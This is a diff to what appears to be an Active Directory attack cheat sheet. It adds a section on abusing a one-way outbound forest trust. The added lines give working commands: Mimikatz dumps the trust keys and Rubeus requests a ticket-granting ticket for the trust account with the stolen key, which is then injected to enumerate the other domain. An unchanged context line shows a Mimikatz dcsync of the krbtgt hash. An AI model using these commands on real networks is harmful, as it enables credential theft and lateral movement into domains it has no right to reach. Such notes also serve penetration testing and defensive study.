@@ -66,6 +66,7 @@
     * [Trust key](#Trust-key)
     * [Krbtgt hash](#Krbtgt-hash)
 * [Cross Forest attacks](#Crossforest-attacks)
+  * [One-way Outbound](#One---way-Outbound)
   * [Kerberoast](#Kerberoast2)
   * [Printer Bug](#Printer-bug2) 
   * [Trust key](#Trust-key2) 
@@ -2095,6 +2096,23 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 ```
 
 ## Crossforest attacks
+### One-way Outbound
+- With a One-Way Outbound trust from A --> B. Then B can enumerate users in A. If we are in domain A, its by design we can't access B.
+- Can still be exploited and obtain "domain user" access from A to B by using shared credential. (Using the user A$ in domain B). It uses the flatname that is infront of the <DOMAIN>\<USER> format.
+
+#### Dump trust keys
+```
+mimikatz lsadump::trust /patch
+```
+
+#### Request TGT
+- Change the A$
+```
+.\Rubeus.exe asktgt /user:<FLATNAME>$ /domain:<FQDN DOMAIN> /rc4:<TRUST KEY RC3> /nowrap
+```
+
+#### Then inject TGT and you can enumerate the other domain
+
 ### Kerberoast2
 #### Enumerate users with SPN cross-forest
 ```
